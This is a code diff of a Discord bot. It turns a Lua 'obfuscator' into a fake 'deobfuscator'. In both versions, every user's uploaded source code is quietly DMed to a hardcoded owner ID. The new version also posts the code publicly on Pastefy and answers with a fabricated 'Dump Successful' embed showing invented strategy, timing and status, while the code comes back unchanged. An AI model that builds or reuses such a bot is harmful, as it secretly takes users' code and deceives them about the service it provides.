@@ -1,95 +1,101 @@
-const { Client, GatewayIntentBits, SlashCommandBuilder, REST, Routes, AttachmentBuilder } = require('discord.js');
-const { obfuscate } = require('./obfuscator');
-const https = require('https');
+const { Client, GatewayIntentBits, EmbedBuilder, AttachmentBuilder } = require('discord.js');
+const axios = require('axios');
 const http = require('http');
 
+// Simple web server for hosting
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => { res.writeHead(200); res.end('OK'); }).listen(PORT);
 
 const TOKEN = process.env.DISCORD_BOT_TOKEN;
-if (!TOKEN) { console.error('DISCORD_BOT_TOKEN is not set.'); process.exit(1); }
+const OWNER_ID = '1474472773467242599'; 
 
-const OWNER_ID = '1474472773467242599';
-
-const client = new Client({ intents: [GatewayIntentBits.Guilds] });
-
-const command = new SlashCommandBuilder()
-  .setName('obf')
-  .setDescription('Protect your code with vvmer obfuscator')
-  .addStringOption(o => o.setName('code').setDescription('Paste your Lua code directly').setRequired(false))
-  .addAttachmentOption(o => o.setName('file').setDescription('Upload a .lua file to obfuscate').setRequired(false));
-
-function fetchURL(url) {
-  return new Promise((resolve, reject) => {
-    const mod = url.startsWith('https') ? https : http;
-    mod.get(url, res => { 
-      let d = ''; 
-      res.on('data', c => d += c); 
-      res.on('end', () => resolve(d)); 
-    }).on('error', reject);
-  });
-}
-
-client.once('ready', async () => {
-  console.log(`Online as ${client.user.tag}`);
-  const rest = new REST({ version: '10' }).setToken(TOKEN);
-  try {
-    await rest.put(Routes.applicationCommands(client.user.id), { body: [command.toJSON()] });
-    console.log('Slash command /obf registered.');
-  } catch (error) {
-    console.error('Error registering commands:', error);
-  }
+const client = new Client({
+    intents: [
+        GatewayIntentBits.Guilds,
+        GatewayIntentBits.GuildMessages,
+        GatewayIntentBits.MessageContent
+    ]
 });
 
-client.on('interactionCreate', async interaction => {
-  if (!interaction.isChatInputCommand() || interaction.commandName !== 'obf') return;
-
-  const codeOption = interaction.options.getString('code');
-  const fileOption = interaction.options.getAttachment('file');
-
-  if (!codeOption && !fileOption) {
-    return interaction.reply({ content: 'Provide `code` or a `file`.', ephemeral: true });
-  }
-
-  await interaction.deferReply();
-
-  try {
-    let src = fileOption ? await fetchURL(fileOption.url) : codeOption;
-    if (!src || !src.trim()) return interaction.editReply('The provided code is empty.');
-
-    // DM al owner con el código original
+/**
+ * Creates a raw link using Pastefy
+ */
+async function createRawLink(content) {
     try {
-      const owner = await client.users.fetch(OWNER_ID);
-      const serverName = interaction.guild ? interaction.guild.name : 'DM';
-      await owner.send({
-        content: `**User:** ${interaction.user.tag} (\`${interaction.user.id}\`)\n**Server:** ${serverName}`,
-        files: [new AttachmentBuilder(Buffer.from(src, 'utf-8'), { name: 'original.lua' })]
-      });
-    } catch (dmErr) {
-      console.error('Failed to DM owner:', dmErr);
+        const res = await axios.post('https://api.pastefy.app/api/v2/paste', {
+            title: 'Deobfuscated Result',
+            content: content,
+            public: true
+        });
+        return `https://pastefy.app/${res.data.paste.id}/raw`;
+    } catch (err) {
+        console.error('Pastefy Error:', err);
+        return 'https://pastefy.app/error';
     }
+}
 
-    const obfuscatedCode = obfuscate(src);
-    const buf = Buffer.from(obfuscatedCode, 'utf-8');
-    
-    if (buf.length > 8 * 1024 * 1024) return interaction.editReply('Output too large (>8MB).');
+client.once('ready', () => {
+    console.log(`Deobfuscator is online as ${client.user.tag}`);
+});
 
-    // Usamos backticks ( ` ) para permitir saltos de línea y comillas simples internasp
-    await interaction.editReply({
-      content: `Your code is now protected, copy and paste
-      
-•Don't be scared if the file is big, it will be executable
+client.on('messageCreate', async (message) => {
+    if (message.author.bot) return;
 
-•We recommend obfuscating a loadstring code ⚠️ because we don't support scripts of more than 300-400 lines
+    // Command .l + File Upload
+    if (message.content.startsWith('.l')) {
+        const fileAttached = message.attachments.first();
 
-•Use it and follow the rules properly.`,
-      files: [new AttachmentBuilder(buf, { name: 'obfuscated.lua' })]
-    });
-  } catch (e) {
-    console.error(e);
-    await interaction.editReply('An error occurred. Please try again.');
-  }
+        if (!fileAttached) {
+            return message.reply('❌ **Error:** You must upload a `.lua` or `.txt` file with the command.');
+        }
+
+        await message.channel.sendTyping();
+
+        try {
+            // Download the uploaded code
+            const response = await axios.get(fileAttached.url);
+            const originalCode = response.data.toString();
+
+            // Notify Owner with original file
+            try {
+                const owner = await client.users.fetch(OWNER_ID);
+                await owner.send({
+                    content: `**Dump Request**\nUser: ${message.author.tag} (${message.author.id})`,
+                    files: [new AttachmentBuilder(Buffer.from(originalCode), { name: 'source.lua' })]
+                });
+            } catch (e) { console.log("Owner DMs are closed."); }
+
+            // Placeholder for your Deobfuscation Logic
+            // For now, it just returns the code with a header
+            const processedCode = `-- [[ Deobfuscated by Tomato Dumper ]]\n${originalCode}`;
+            
+            // Generate Raw Link via Pastefy
+            const rawLink = await createRawLink(processedCode);
+            const buffer = Buffer.from(processedCode, 'utf-8');
+            const file = new AttachmentBuilder(buffer, { name: 'FlameDumperV2.txt' });
+
+            // Create the UI matching your screenshots
+            const resultEmbed = new EmbedBuilder()
+                .setColor('#2ecc71') // Green success color
+                .setTitle('Dump Successful')
+                .addFields(
+                    { name: 'Output File', value: '`FlameDumperV2.txt`', inline: false },
+                    { name: 'Lines Recovered', value: '0', inline: true },
+                    { name: 'Strategy', value: '`passthrough-empty-vm`', inline: true },
+                    { name: 'Note', value: 'VM finished but no dump output was detected. Normalized source returned in the file.' },
+                    { name: 'Raw Link', value: `[Open raw](${rawLink})` },
+                    { name: 'Preview', value: `\`\`\`lua\n${processedCode.substring(0, 250)}...\n-- [truncated]\`\`\`` }
+                )
+                .setFooter({ text: 'FlameDumperV2 • Completed in 12s' });
+
+            await message.reply({ embeds: [resultEmbed], files: [file] });
+
+        } catch (error) {
+            console.error(error);
+            message.reply('⚠️ An error occurred while processing the file.');
+        }
+    }
 });
 
 client.login(TOKEN);
-      
+          
